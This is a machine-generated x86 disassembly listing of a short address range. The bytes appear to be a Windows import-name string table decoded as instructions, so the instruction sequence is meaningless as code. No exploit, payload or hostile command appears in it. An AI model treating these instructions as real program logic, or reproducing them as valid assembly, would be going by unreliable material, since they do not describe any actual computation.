  428cd3:	add    BYTE PTR [ecx+0x66654400],cl
  428cd9:	inc    esi
  428cda:	jb     0x428d3d
  428cdc:	ins    DWORD PTR es:[edi],dx
  428cdd:	gs push eax
  428cdf:	jb     0x428d50
  428ce1:	arpl   WORD PTR [ecx+0x0],ax
  428ce4:	mov    ebx,0x61724400
  428ce9:	ja     0x428d3f
  428ceb:	gs js  0x428d62
  428cee:	inc    ebp
  428cef:	js     0x428d48
  428cf1:	add    BYTE PTR [edx+0x666e4901],al
  428cf7:	ins    BYTE PTR es:[edi],dx
  428cf8:	popa   
  428cf9:	je     0x428d60
  428cfb:	push   edx
  428cfc:	arpl   WORD PTR gs:[eax+eax*1+0x5],si
  428d01:	add    dl,BYTE PTR [edx+0x65]
  428d04:	imul   esi,DWORD PTR [bp+di+0x74],0x6c437265
  428d0c:	popa   
  428d0d:	jae    0x428d82
  428d0f:	push   edi
  428d10:	add    BYTE PTR [eax],al
  428d12:	inc    ebp
  428d13:	add    dl,BYTE PTR [ebx+0x65]
  428d16:	je     0x428d64
  428d18:	popa   
  428d19:	jae    0x428d8f
  428d1b:	inc    ebp
  428d1c:	jb     0x428d90
  428d1e:	outs   dx,DWORD PTR ds:[esi]
  428d1f:	jb     0x428d66
  428d21:	js     0x428d23
  428d23:	add    BYTE PTR [edx+0x43734901],dl
  428d29:	push   0x70557261
  428d2e:	jo     0x428d95
  428d30:	jb     0x428d73
  428d32:	add    BYTE PTR [eax],al
  428d34:	inc    ebx
  428d35:	add    BYTE PTR [ebx+0x6c],al
  428d38:	imul   esp,DWORD PTR [ebp+0x6e],0x536f5474
  428d3f:	arpl   WORD PTR [edx+0x65],si
  428d42:	outs   dx,BYTE PTR gs:[esi]
  428d44:	add    BYTE PTR [eax],al
  428d46:	push   ecx
  428d47:	add    dl,BYTE PTR [ebx+0x65]
  428d4a:	je     0x428d9c
  428d4c:	popa   
  428d4d:	jb     0x428db4
  428d4f:	outs   dx,BYTE PTR ds:[esi]
  428d50:	je     0x428d52
  428d52:	xchg   ecx,eax
  428d53:	add    dl,BYTE PTR [edx+esi*2+0x61]
  428d57:	arpl   WORD PTR [ebx+0x50],bp
  428d5a:	outs   dx,DWORD PTR ds:[esi]
  428d5b:	jo     0x428dd2
  428d5d:	jo     0x428dac
  428d5f:	outs   dx,BYTE PTR gs:[esi]
  428d61:	jne    0x428da8
  428d63:	js     0x428d65
  428d65:	add    BYTE PTR [edx],ah
  428d67:	add    DWORD PTR [edi+0x65],eax
  428d6a:	je     0x428db7
  428d6c:	gs jns 0x428dd1
  428d6f:	outs   dx,DWORD PTR ds:[esi]
  428d70:	popa   
  428d71:	jb     0x428dd7
  428d73:	dec    esp
  428d74:	popa   
  428d75:	jns    0x428de6
  428d77:	jne    0x428ded
  428d79:	add    bl,bh
  428d7b:	add    BYTE PTR [edi+0x65],al
  428d7e:	je     0x428dc3
  428d80:	ins    BYTE PTR es:[edi],dx
  428d81:	popa   
  428d82:	jae    0x428df7
  428d84:	dec    esi
  428d85:	popa   
  428d86:	ins    DWORD PTR es:[edi],dx
  428d87:	gs push edi
  428d89:	add    ch,bl
  428d8b:	add    BYTE PTR [ebp+0x71],al
  428d8e:	jne    0x428df1
  428d90:	ins    BYTE PTR es:[edi],dx
  428d91:	push   edx
  428d92:	arpl   WORD PTR gs:[eax+eax*1+0x32],si
  428d97:	add    dl,BYTE PTR [ebx+0x65]
  428d9a:	je     0x428ddf
  428d9c:	popa   
  428d9d:	jb     0x428e04
  428d9f:	je     0x428df1
  428da1:	outs   dx,DWORD PTR ds:[esi]
  428da2:	jae    0x428da4
  428da4:	and    al,0x0
  428da6:	inc    ebx
  428da7:	push   0x65676e61
  428dac:	dec    ebp
  428dad:	outs   dx,BYTE PTR gs:[esi]
  428daf:	jne    0x428e08
  428db1:	add    BYTE PTR [eax+0x73654400],bl
  428db7:	je     0x428e2b
  428db9:	outs   dx,DWORD PTR ds:[esi]
  428dba:	jns    0x428e13
  428dbc:	imul   ebp,DWORD PTR [esi+0x64],0xf500776f
  428dc3:	add    DWORD PTR [eax+0x6f],edx
  428dc6:	jae    0x428e3c
  428dc8:	push   esp
  428dc9:	push   0x64616572
  428dce:	dec    ebp
  428dcf:	gs jae 0x428e45
  428dd2:	popa   
  428dd3:	addr16 gs push edi
  428dd6:	add    BYTE PTR [eax],al
  428dd8:	push   edi
  428dd9:	add    dl,BYTE PTR [ebx+0x65]
  428ddc:	je     0x428e2e
  428dde:	jb     0x428e4f
  428de0:	jo     0x428e39
  428de2:	add    BYTE PTR [eax],al
  428de4:	mov    al,0x1
  428de6:	dec    esp
  428de7:	outs   dx,DWORD PTR ds:[esi]
  428de8:	popa   
  428de9:	fs dec ecx
  428deb:	arpl   WORD PTR [edi+0x6e],bp
  428dee:	push   edi
  428def:	add    bl,bh
  428df1:	add    DWORD PTR [eax+0x74],edx
  428df4:	dec    ecx
  428df5:	outs   dx,BYTE PTR ds:[esi]
  428df6:	push   edx
  428df7:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  428dfc:	dec    edx
  428dfd:	add    dl,BYTE PTR [ebx+0x65]
  428e00:	je     0x428e4f
  428e02:	outs   dx,BYTE PTR gs:[esi]
  428e04:	jne    0x428e4a
  428e06:	gs popaw 
  428e09:	jne    0x428e77
  428e0b:	je     0x428e56
  428e0d:	je     0x428e74
  428e0f:	ins    DWORD PTR es:[edi],dx
  428e10:	add    BYTE PTR [eax],al
  428e12:	sti    
  428e13:	add    dl,BYTE PTR [edx+esi*2+0x61]
  428e17:	arpl   WORD PTR [ebx+0x50],bp
  428e1a:	outs   dx,DWORD PTR ds:[esi]
  428e1b:	jo     0x428e92
  428e1d:	jo     0x428e6c
  428e1f:	outs   dx,BYTE PTR gs:[esi]
  428e21:	jne    0x428e23
  428e23:	add    BYTE PTR [ebp+0x64705502],ah
  428e29:	popa   
  428e2a:	je     0x428e91
  428e2c:	push   edi
  428e2d:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  428e34:	push   ss
  428e35:	add    dl,BYTE PTR [edx+0x65]
  428e38:	ins    DWORD PTR es:[edi],dx
  428e39:	outs   dx,DWORD PTR ds:[esi]
  428e3a:	jbe    0x428ea1
  428e3c:	dec    ebp
  428e3d:	outs   dx,BYTE PTR gs:[esi]
  428e3f:	jne    0x428e41
  428e41:	add    BYTE PTR [edx+0x61724400],dh
  428e47:	ja     0x428e8f
  428e49:	jb     0x428eac
  428e4b:	ins    DWORD PTR es:[edi],dx
  428e4c:	gs inc ebx
  428e4e:	outs   dx,DWORD PTR ds:[esi]
  428e4f:	outs   dx,BYTE PTR ds:[esi]
  428e50:	je     0x428ec4
  428e52:	outs   dx,DWORD PTR ds:[esi]
  428e53:	ins    BYTE PTR es:[edi],dx
  428e54:	add    BYTE PTR [eax],al
  428e56:	mov    dl,0x1
  428e58:	dec    esp
  428e59:	outs   dx,DWORD PTR ds:[esi]
  428e5a:	popa   
  428e5b:	fs dec ecx
  428e5d:	ins    DWORD PTR es:[edi],dx
  428e5e:	popa   
  428e5f:	addr16 gs push edi
  428e62:	add    BYTE PTR [eax],al
  428e64:	add    al,BYTE PTR [eax]
  428e66:	inc    ecx
  428e67:	fs push 0x75
  428e6a:	jae    0x428ee0
  428e6c:	push   edi
  428e6d:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  428e74:	arpl   WORD PTR [eax+eax*1+0x0],si
  428e78:	add    DWORD PTR [ecx],0x65536e49
  428e7e:	outs   dx,BYTE PTR ds:[esi]
  428e7f:	fs dec ebp
  428e81:	gs jae 0x428ef7
  428e84:	popa   
  428e85:	addr16 gs inc ebp
  428e88:	js     0x428e8a
  428e8a:	xchg   BYTE PTR [ecx],al
  428e8c:	dec    ecx
  428e8d:	outs   dx,BYTE PTR ds:[esi]
  428e8e:	jae    0x428ef5
  428e90:	jb     0x428f06
  428e92:	dec    ebp
  428e93:	outs   dx,BYTE PTR gs:[esi]
  428e95:	jne    0x428eee
  428e97:	add    BYTE PTR ds:0x6c6c4100,al
  428e9d:	outs   dx,DWORD PTR ds:[esi]
  428e9e:	ja     0x428ef3
  428ea0:	gs je  0x428ee9
  428ea3:	outs   dx,DWORD PTR ds:[esi]
  428ea4:	jb     0x428f0b
  428ea6:	addr16 jb 0x428f18
  428ea9:	jne    0x428f19
  428eab:	fs push edi
  428ead:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  428eb4:	add    BYTE PTR [edx],0x53
  428eb7:	ja     0x428f1a
  428eb9:	jo     0x428f08
  428ebb:	outs   dx,DWORD PTR ds:[esi]
  428ebc:	jne    0x428f31
  428ebe:	gs inc edx
  428ec0:	jne    0x428f36
  428ec2:	je     0x428f33
  428ec4:	outs   dx,BYTE PTR ds:[esi]
  428ec5:	add    bh,ch
  428ec7:	add    DWORD PTR [eax+0x65],edx
  428eca:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  428ecf:	jae    0x428f32
  428ed1:	addr16 gs push edi
  428ed4:	add    BYTE PTR [eax],al
  428ed6:	cdq    
  428ed7:	add    BYTE PTR [ecx+ebp*2+0x61],al
  428edb:	ins    BYTE PTR es:[edi],dx
  428edc:	outs   dx,DWORD PTR ds:[esi]
  428edd:	addr16 inc edx
  428edf:	outs   dx,DWORD PTR ds:[esi]
  428ee0:	js     0x428f2b
  428ee2:	outs   dx,BYTE PTR ds:[esi]
  428ee3:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  428eeb:	jb     0x428f4e
  428eed:	ins    DWORD PTR es:[edi],dx
  428eee:	inc    ecx
  428eef:	add    BYTE PTR [ebp+0x0],bl
  428ef2:	inc    ebx
  428ef3:	jb     0x428f5a
  428ef5:	popa   
  428ef6:	je     0x428f5d
  428ef8:	dec    ecx
  428ef9:	arpl   WORD PTR [edi+0x6e],bp
  428efc:	dec    ecx
  428efd:	outs   dx,BYTE PTR ds:[esi]
  428efe:	imul   esi,DWORD PTR fs:[edx+0x65],0x7463
  428f06:	stos   BYTE PTR es:[edi],al
  428f07:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  428f0b:	fs inc edx
  428f0d:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xb1005770
  428f15:	add    dl,BYTE PTR [esi+0x6b]
  428f18:	dec    ebx
  428f19:	gs jns 0x428f6f
  428f1c:	arpl   WORD PTR [ecx+0x6e],sp
  428f1f:	push   edi
  428f20:	add    BYTE PTR [eax],al
  428f22:	adc    eax,DWORD PTR [ecx]
  428f24:	inc    edi
  428f25:	gs je  0x428f6c
  428f28:	outs   dx,DWORD PTR ds:[esi]
  428f29:	jne    0x428f8d
  428f2b:	ins    BYTE PTR es:[edi],dx
  428f2c:	gs inc ebx
  428f2e:	ins    BYTE PTR es:[edi],dx
  428f2f:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  428f36:	add    BYTE PTR [eax],al
  428f38:	add    WORD PTR [edi+0x65],ax
  428f3c:	je     0x428f93
  428f3e:	jae    0x428fa5
  428f40:	jb     0x428f91
  428f42:	bound  ebp,QWORD PTR [edx+0x65]
  428f45:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  428f49:	outs   dx,WORD PTR ds:[esi]
  428f4b:	jb     0x428fba
  428f4d:	popa   
  428f4e:	je     0x428fb9
  428f50:	outs   dx,DWORD PTR ds:[esi]
  428f51:	outs   dx,BYTE PTR ds:[esi]
  428f52:	push   edi
  428f53:	add    BYTE PTR [eax+0x1],bl
  428f56:	inc    edi
  428f57:	gs je  0x428fad
  428f5a:	jne    0x428fbe
  428f5c:	dec    ebp
  428f5d:	outs   dx,BYTE PTR gs:[esi]
  428f5f:	jne    0x428f61
  428f61:	add    dh,dh
  428f63:	add    BYTE PTR [edi+0x65],al
  428f66:	je     0x428fab
  428f68:	ins    BYTE PTR es:[edi],dx
  428f69:	popa   
  428f6a:	jae    0x428fdf
  428f6c:	dec    ecx
  428f6d:	outs   dx,BYTE PTR ds:[esi]
  428f6e:	outs   dx,WORD PTR ds:[esi]
  428f70:	inc    ebp
  428f71:	js     0x428fca
  428f73:	add    BYTE PTR [ecx+eax*1],cl
  428f76:	inc    edi
  428f77:	gs je  0x428fbe
  428f7a:	gs jae 0x428fe8
  428f7d:	je     0x428fee
  428f7f:	jo     0x428fd8
  428f81:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  428f88:	sub    eax,0x6e655302
  428f8d:	fs dec esi
  428f8f:	outs   dx,DWORD PTR ds:[esi]
  428f90:	je     0x428ffb
  428f92:	data16 jns 0x428fe2
  428f95:	gs jae 0x42900b
  428f98:	popa   
  428f99:	addr16 gs push edi
  428f9c:	add    BYTE PTR [eax],al
  428f9e:	and    al,BYTE PTR [edx]
  428fa0:	push   ebx
  428fa1:	outs   dx,BYTE PTR gs:[esi]
  428fa3:	fs inc esp
  428fa5:	ins    BYTE PTR es:[edi],dx
  428fa6:	addr16 dec ecx
  428fa8:	je     0x42900f
  428faa:	ins    DWORD PTR es:[edi],dx
  428fab:	dec    ebp
  428fac:	gs jae 0x429022
  428faf:	popa   
  428fb0:	addr16 gs push edi
  428fb3:	add    BYTE PTR [eax],ch
  428fb5:	add    DWORD PTR [edi+0x65],eax
  428fb8:	je     0x429006
  428fba:	popa   
  428fbb:	jae    0x429031
  428fbd:	inc    ecx
  428fbe:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  428fc2:	gs push eax
  428fc4:	outs   dx,DWORD PTR ds:[esi]
  428fc5:	jo     0x42903c
  428fc7:	jo     0x428fc9
  428fc9:	add    BYTE PTR [ecx],ch
  428fcb:	add    BYTE PTR [ebx+0x68],al
  428fce:	popa   
  428fcf:	jb     0x42901d
  428fd1:	outs   dx,DWORD PTR ds:[esi]
  428fd2:	ja     0x429039
  428fd4:	jb     0x42902d
  428fd6:	add    BYTE PTR [eax],al
  428fd8:	xor    al,BYTE PTR [ecx]
  428fda:	inc    edi
  428fdb:	gs je  0x42902b
  428fde:	outs   dx,BYTE PTR gs:[esi]
  428fe0:	jne    0x42902b
  428fe2:	je     0x429049
  428fe4:	ins    DWORD PTR es:[edi],dx
  428fe5:	inc    ebx
  428fe6:	outs   dx,DWORD PTR ds:[esi]
  428fe7:	jne    0x429057
  428fe9:	je     0x428feb
  428feb:	add    BYTE PTR ds:0x74655302,bh
  428ff1:	inc    esp
  428ff2:	ins    BYTE PTR es:[edi],dx
  428ff3:	addr16 dec ecx
  428ff5:	je     0x42905c
  428ff7:	ins    DWORD PTR es:[edi],dx
  428ff8:	dec    ecx
  428ff9:	outs   dx,BYTE PTR ds:[esi]
  428ffa:	je     0x428ffc
  428ffc:	mov    al,ds:0x57734901
  429001:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  429008:	mov    ds:0x57734901,al
  42900d:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  429014:	imul   esp,DWORD PTR [ebx+0x6f],0xe7006564
  42901b:	add    DWORD PTR [edi+0x70],ecx
  42901e:	outs   dx,BYTE PTR gs:[esi]
  429020:	inc    esp
  429021:	gs jae 0x42908f
  429024:	je     0x429095
  429026:	jo     0x42907f
  429028:	add    BYTE PTR [eax],al
  42902a:	cmp    al,BYTE PTR [eax]
  42902c:	inc    ebx
  42902d:	push   0x446b6365
  429032:	ins    BYTE PTR es:[edi],dx
  429033:	addr16 inc edx
  429035:	jne    0x4290ab
  429037:	je     0x4290a8
  429039:	outs   dx,BYTE PTR ds:[esi]
  42903a:	add    BYTE PTR [eax],al
  42903c:	mov    eax,DWORD PTR [ecx]
  42903e:	dec    ecx
  42903f:	outs   dx,BYTE PTR ds:[esi]
  429040:	jbe    0x4290a7
  429042:	jb     0x4290b8
  429044:	push   edx
  429045:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  42904a:	pop    DWORD PTR [eax]
  42904c:	inc    esp
  42904d:	gs push di
  429050:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  429057:	outs   dx,DWORD PTR ds:[esi]
  429058:	arpl   WORD PTR [edi+0x0],dx
  42905b:	add    BYTE PTR ds:0x74654701,cl
  429061:	inc    esp
  429062:	imul   esp,DWORD PTR [ecx+0x6c],0x6142676f
  429069:	jae    0x4290d0
  42906b:	push   ebp
  42906c:	outs   dx,BYTE PTR ds:[esi]
  42906d:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x47016500
  429075:	gs je  0x4290cd
  429078:	jae    0x4290df
  42907a:	jb     0x4290cb
  42907c:	bound  ebp,QWORD PTR [edx+0x65]
  42907f:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  429083:	outs   dx,WORD PTR ds:[esi]
  429085:	jb     0x4290f4
  429087:	popa   
  429088:	je     0x4290f3
  42908a:	outs   dx,DWORD PTR ds:[esi]
  42908b:	outs   dx,BYTE PTR ds:[esi]
  42908c:	inc    ecx
  42908d:	add    BYTE PTR [ecx+0x44734901],bl
  429093:	ins    BYTE PTR es:[edi],dx
  429094:	addr16 inc edx
  429096:	jne    0x42910c
  429098:	je     0x429109
  42909a:	outs   dx,BYTE PTR ds:[esi]
  42909b:	inc    ebx
  42909c:	push   0x656b6365
  4290a1:	add    BYTE PTR fs:[eax],al
  4290a4:	ins    DWORD PTR es:[edi],dx
  4290a5:	add    DWORD PTR [edi+0x65],eax
  4290a8:	je     0x429101
  4290aa:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  4290b1:	outs   dx,BYTE PTR ds:[esi]
  4290b2:	addr16 push edi
  4290b4:	add    BYTE PTR [eax],al
  4290b6:	popa   
  4290b7:	add    BYTE PTR [ebx+0x72],al
  4290ba:	gs popa 
  4290bc:	je     0x429123
  4290be:	push   eax
  4290bf:	outs   dx,DWORD PTR ds:[esi]
  4290c0:	jo     0x429137
  4290c2:	jo     0x429111
  4290c4:	outs   dx,BYTE PTR gs:[esi]
  4290c6:	jne    0x4290c8
  4290c8:	sbb    eax,DWORD PTR [eax]
  4290ca:	inc    ebx
  4290cb:	popa   
  4290cc:	ins    BYTE PTR es:[edi],dx
  4290cd:	ins    BYTE PTR es:[edi],dx
  4290ce:	push   edi
  4290cf:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  4290d6:	outs   dx,DWORD PTR ds:[esi]
  4290d7:	arpl   WORD PTR [edi+0x0],dx
  4290da:	stos   DWORD PTR es:[edi],eax
  4290db:	add    BYTE PTR [edx+esi*2+0x61],al
  4290df:	ja     0x429122
  4290e1:	outs   dx,BYTE PTR ds:[esi]
  4290e2:	imul   ebp,DWORD PTR [ebp+0x61],0x52646574
  4290e9:	arpl   WORD PTR gs:[ebx+esi*2+0x0],si
  4290ee:	sahf   
  4290ef:	add    DWORD PTR [ecx+0x73],ecx
  4290f2:	push   edx
  4290f3:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  4290f8:	jo     0x42916e
  4290fa:	jns    0x4290fc
  4290fc:	inc    BYTE PTR [eax]
  4290fe:	inc    edi
  4290ff:	gs je  0x429145
  429102:	ins    BYTE PTR es:[edi],dx
  429103:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  42910a:	jb     0x42910c
  42910c:	lds    eax,FWORD PTR [eax]
  42910e:	inc    ebp
  42910f:	outs   dx,BYTE PTR ds:[esi]
  429110:	fs push eax
  429112:	popa   
  429113:	imul   ebp,DWORD PTR [esi+0x74],0xdc0000
  42911a:	inc    ebp
  42911b:	outs   dx,BYTE PTR ds:[esi]
  42911c:	jne    0x42918b
  42911e:	push   edi
  42911f:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  429126:	xchg   DWORD PTR [ecx],eax
  429128:	dec    ecx
  429129:	outs   dx,BYTE PTR ds:[esi]
  42912a:	je     0x429191
  42912c:	jb     0x42919c
  42912e:	popa   
  42912f:	ins    BYTE PTR es:[edi],dx
  429130:	inc    edi
  429131:	gs je  0x42918b
  429134:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  42913b:	js     0x4291b1
  42913d:	add    BYTE PTR [eax+0x43734901],dl
  429143:	push   0x6f4c7261
  429148:	ja     0x4291af
  42914a:	jb     0x42918d
  42914c:	add    BYTE PTR [eax],al
  42914e:	aad    0x1
  429150:	dec    ebp
  429151:	gs jae 0x4291c7
  429154:	popa   
  429155:	addr16 gs inc edx
  429158:	outs   dx,DWORD PTR ds:[esi]
  429159:	js     0x4291b2
  42915b:	add    BYTE PTR [edi+0x636f4c01],bh
  429161:	imul   edx,DWORD PTR [edi+0x69],0x6e
  429165:	outs   dx,DWORD PTR fs:[esi]
  429167:	ja     0x4291be
  429169:	jo     0x4291cf
  42916b:	popa   
  42916c:	je     0x4291d3
  42916e:	add    BYTE PTR [eax],al
  429170:	add    BYTE PTR es:[ebx+0x68],al
  429174:	popa   
  429175:	jb     0x4291c3
  429177:	outs   dx,DWORD PTR ds:[esi]
  429178:	ja     0x4291df
  42917a:	jb     0x4291bd
  42917c:	add    BYTE PTR [eax],al
  42917e:	call   0x6e6f:0x696e5502
  429185:	push   edx
  429186:	arpl   WORD PTR gs:[eax+eax*1+0x38],si
  42918b:	add    DWORD PTR [edi+0x65],eax
  42918e:	je     0x4291dd
  429190:	outs   dx,BYTE PTR gs:[esi]
  429192:	jne    0x4291e7
  429194:	je     0x429208
  429196:	imul   ebp,DWORD PTR [esi+0x67],0xd9000041
  42919d:	add    DWORD PTR [ebp+0x6f],ecx
  4291a0:	outs   dx,BYTE PTR ds:[esi]
  4291a1:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x6d6f7246
  4291a9:	push   edx
  4291aa:	arpl   WORD PTR gs:[eax+eax*1+0x6d],si
  4291af:	add    dl,BYTE PTR [ebx+0x65]
  4291b2:	je     0x42920b
  4291b4:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  4291bb:	outs   dx,BYTE PTR ds:[esi]
  4291bc:	addr16 inc ecx
  4291be:	add    BYTE PTR [eax],al
  4291c0:	or     al,0x0
  4291c2:	inc    edx
  4291c3:	imul   ebp,DWORD PTR gs:[bp+0x44],0x72656665
  4291cc:	push   edi
  4291cd:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  4291d4:	jae    0x4291d6
  4291d6:	add    BYTE PTR cs:[ebx+0x68],al
  4291da:	popa   
  4291db:	jb     0x42922d
  4291dd:	jb     0x429244
  4291df:	jbe    0x429222
  4291e1:	add    bl,bl
  4291e3:	add    DWORD PTR [ebp+0x6f],ecx
  4291e6:	jbe    0x42924d
  4291e8:	push   edi
  4291e9:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  4291f0:	mov    dh,0x1
  4291f2:	dec    esp
  4291f3:	outs   dx,DWORD PTR ds:[esi]
  4291f4:	popa   
  4291f5:	fs dec ebp
  4291f7:	outs   dx,BYTE PTR gs:[esi]
  4291f9:	jne    0x42923c
  4291fb:	add    BYTE PTR [ebp+0x79656b02],bh
  429201:	bound  esp,QWORD PTR [edi+ebx*2+0x65]
  429205:	jbe    0x42926c
  429207:	outs   dx,BYTE PTR ds:[esi]
  429208:	je     0x42920a
  42920a:	pop    esp
  42920b:	add    DWORD PTR [edi+0x65],eax
  42920e:	je     0x429263
  429210:	jns    0x429285
  429212:	je     0x429279
  429214:	ins    DWORD PTR es:[edi],dx
  429215:	dec    ebp
  429216:	gs je  0x42928b
  429219:	imul   esp,DWORD PTR [ebx+0x73],0x1af0000
  429220:	dec    esp
  429221:	outs   dx,DWORD PTR ds:[esi]
  429222:	popa   
  429223:	fs dec ecx
  429225:	arpl   WORD PTR [edi+0x6e],bp
  429228:	inc    ecx
  429229:	add    BYTE PTR [ebx+0x1],al
  42922c:	inc    edi
  42922d:	gs je  0x42927e
  429230:	gs js  0x4292a7
  429233:	inc    esp
  429234:	ins    BYTE PTR es:[edi],dx
  429235:	addr16 push esp
  429237:	popa   
  429238:	bound  ecx,QWORD PTR [ecx+0x74]
  42923b:	gs ins DWORD PTR es:[edi],dx
  42923d:	add    BYTE PTR [ebx+0x61724400],dh
  429243:	ja     0x42928e
  429245:	arpl   WORD PTR [edi+0x6e],bp
  429248:	add    BYTE PTR [eax],al
  42924a:	std    
  42924b:	add    BYTE PTR [edi+0x65],al
  42924e:	je     0x429293
  429250:	ins    BYTE PTR es:[edi],dx
  429251:	imul   esp,DWORD PTR [ebp+0x6e],0x63655274
  429258:	je     0x42925a
  42925a:	add    DWORD PTR ds:[edi+0x65],eax
  42925e:	je     0x4292ad
  429260:	gs jae 0x4292d6
  429263:	popa   
  429264:	addr16 gs push edi
  429267:	add    BYTE PTR [edx+0x1],al
  42926a:	inc    edi
  42926b:	gs je  0x4292bc
  42926e:	gs js  0x4292e5
  429271:	inc    esp
  429272:	ins    BYTE PTR es:[edi],dx
  429273:	addr16 inc edi
  429275:	jb     0x4292e6
  429277:	jne    0x4292e9
  429279:	dec    ecx
  42927a:	je     0x4292e1
  42927c:	ins    DWORD PTR es:[edi],dx
  42927d:	add    BYTE PTR ds:0x6c655202,dl
  429283:	gs popa 
  429285:	jae    0x4292ec
  429287:	inc    esp
  429288:	inc    ebx
  429289:	add    BYTE PTR [ebp+0x53],dl
  42928c:	inc    ebp
  42928d:	push   edx
  42928e:	xor    esi,DWORD PTR [edx]
  429290:	cs fs ins BYTE PTR es:[edi],dx
  429293:	ins    BYTE PTR es:[edi],dx
  429294:	add    BYTE PTR [eax],al
  429296:	add    ecx,DWORD PTR ss:[ebp+0x6f]
  42929a:	jbe    0x429301
  42929c:	inc    esi
  42929d:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0x71004178
  4292a5:	add    DWORD PTR [esi+0x69],eax
  4292a8:	outs   dx,BYTE PTR ds:[esi]
  4292a9:	fs push edx
  4292ab:	gs jae 0x42931d
  4292ae:	jne    0x429322
  4292b0:	arpl   WORD PTR [ebp+0x45],sp
  4292b3:	js     0x42930c
  4292b5:	add    BYTE PTR [ebx],dl
  4292b7:	add    al,0x53
  4292b9:	gs je  0x4292ff
  4292bc:	jne    0x429330
  4292be:	jb     0x429325
  4292c0:	outs   dx,BYTE PTR ds:[esi]
  4292c1:	je     0x429307
  4292c3:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4292ca:	jns    0x42930d
  4292cc:	add    BYTE PTR [eax],al
  4292ce:	sub    BYTE PTR [ebx+edx*2],al
  4292d1:	gs je  0x42931c
  4292d4:	popa   
  4292d5:	outs   dx,BYTE PTR ds:[esi]
  4292d6:	fs ins BYTE PTR es:[edi],dx
  4292d8:	gs inc ebx
  4292da:	outs   dx,DWORD PTR ds:[esi]
  4292db:	jne    0x42934b
  4292dd:	je     0x4292df
  4292df:	add    BYTE PTR [ebx+0x6d6f4300],dh
  4292e5:	jo     0x429348
  4292e7:	jb     0x42934e
  4292e9:	push   ebx
  4292ea:	je     0x42935e
  4292ec:	imul   ebp,DWORD PTR [esi+0x67],0x52000041
  4292f3:	add    DWORD PTR [esi+0x69],eax
  4292f6:	ins    BYTE PTR es:[edi],dx
  4292f7:	gs push esp
  4292f9:	imul   ebp,DWORD PTR [ebp+0x65],0x6f4c6f54
  429300:	arpl   WORD PTR [ecx+0x6c],sp
  429303:	inc    esi
  429304:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x656d69
  42930c:	cmp    eax,DWORD PTR [ebx+edx*2]
  42930f:	gs je  0x429365
  429312:	jns    0x429387
  429314:	je     0x42937b
  429316:	ins    DWORD PTR es:[edi],dx
  429317:	push   esp
  429318:	imul   ebp,DWORD PTR [ebp+0x65],0x47018e00
  42931f:	gs je  0x429363
  429322:	inc    ebx
  429323:	push   eax
  429324:	add    BYTE PTR [eax],al
  429326:	arpl   WORD PTR [ecx],ax
  429328:	inc    esi
  429329:	imul   ebp,DWORD PTR [esi+0x64],0x73726946
  429330:	je     0x429378
  429332:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x33f0000
  42933a:	dec    esp
  42933b:	outs   dx,DWORD PTR ds:[esi]
  42933c:	popa   
  42933d:	fs dec esp
  42933f:	imul   esp,DWORD PTR [edx+0x72],0x57797261
  429346:	add    BYTE PTR [eax],al
  429348:	push   ss
  429349:	add    DWORD PTR [ebp+0x6e],eax
  42934c:	je     0x4293b3
  42934e:	jb     0x429393
  429350:	jb     0x4293bb
  429352:	je     0x4293bd
  429354:	arpl   WORD PTR [ecx+0x6c],sp
  429357:	push   ebx
  429358:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  42935d:	outs   dx,BYTE PTR ds:[esi]
  42935e:	add    BYTE PTR [eax],al
  429360:	cdq    
  429361:	add    DWORD PTR [edi+0x65],eax
  429364:	je     0x4293a9
  429366:	outs   dx,DWORD PTR ds:[esi]
  429367:	ins    DWORD PTR es:[edi],dx
  429368:	ins    DWORD PTR es:[edi],dx
  429369:	inc    ebx
  42936a:	outs   dx,DWORD PTR ds:[esi]
  42936b:	outs   dx,BYTE PTR ds:[esi]
  42936c:	imul   sp,WORD PTR [edi+0x0],0x188
  429372:	inc    esi
  429373:	jb     0x4293da
  429375:	gs push edx
  429377:	gs jae 0x4293e9
  42937a:	jne    0x4293ee
  42937c:	arpl   WORD PTR [ebp+0x0],sp
  42937f:	add    BYTE PTR [eax+0x1],ah
  429382:	inc    esi
  429383:	imul   ebp,DWORD PTR [esi+0x64],0x73726946
  42938a:	je     0x4293d2
  42938c:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x1930000
  429394:	inc    edi
  429395:	gs je  0x4293da
  429398:	imul   ebp,DWORD PTR [esi+0x61],0x79547972
  42939f:	jo     0x429406
  4293a1:	push   edi
  4293a2:	add    BYTE PTR [eax],al
  4293a4:	fiadd  WORD PTR [esp+ebp*2]
  4293a7:	jae    0x42941d
  4293a9:	jb     0x429417
  4293ab:	outs   dx,BYTE PTR gs:[esi]
  4293ad:	push   edi
  4293ae:	add    BYTE PTR [eax],al
